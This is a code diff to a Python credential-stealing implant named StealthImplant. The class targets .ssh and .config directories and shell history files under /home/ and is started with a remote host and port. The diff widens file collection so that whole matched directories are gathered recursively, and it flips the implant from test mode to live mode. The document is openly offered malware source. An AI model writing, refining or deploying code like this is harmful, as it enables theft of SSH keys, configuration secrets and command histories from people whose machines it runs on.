@@ -15,8 +15,10 @@ class StealthImplant:
         self, 
         server_ip=None,
         server_port=None,
+        # "/home/user1"
         source="/home/",
         # This can be either directory or file
+        # This should be really specific
         target_files=[
             ".ssh", 
             ".config", 
@@ -69,26 +71,25 @@ class StealthImplant:
     def walk_dir(self):
         collected = [] 
         for root, dirs, files in os.walk(self.root_dir, followlinks=False):
-            # dirs[:] = [d for d in dirs if d not in self.ignore_dirs]
-            
+            current_path = Path(root)
             # if current directly is what we are looking for
-            if any(target_dir in root for target_dir in self.target_files):
-                for f in files:
-                    self._log(f"Found: ${Path(root) / f}")
-                    collected.append(Path(root) / f)
-            
+            if any(current_path.name == tf for tf in self.target_files):
+                self._log(f"Found: ${current_path}")
+                collected.append(current_path) # add directory itself
+                for path in current_path.rglob("*"):
+                    collected.append(path)
+
             # if it contains the file we need
             for f in files:
                 if f in self.target_files:
-                    self._log(f"Found: {Path(root) / f}")
+                    self._log(f"Found: {current_path / f}")
                     collected.append(Path(root) / f)
                     
             if self.history_glob:
                 for f in files:
                     if Path(f).match(self.history_glob):
-                        self._log(f"Found: {Path(root) / f}")
+                        self._log(f"Found: {current_path / f}")
                         collected.append(Path(root) / f)
-
         return list(set(collected))
 
         
@@ -125,12 +126,13 @@ class StealthImplant:
 def main():
     if len(sys.argv) != 3:
         print("Usage: ./tmp363 <host> <port>")
+        return
     host = sys.argv[1]
     port = int(sys.argv[2])
     implant = StealthImplant(
         server_ip=host, 
         server_port=port,
-        test=True
+        test=False
     )
     implant.run()
 
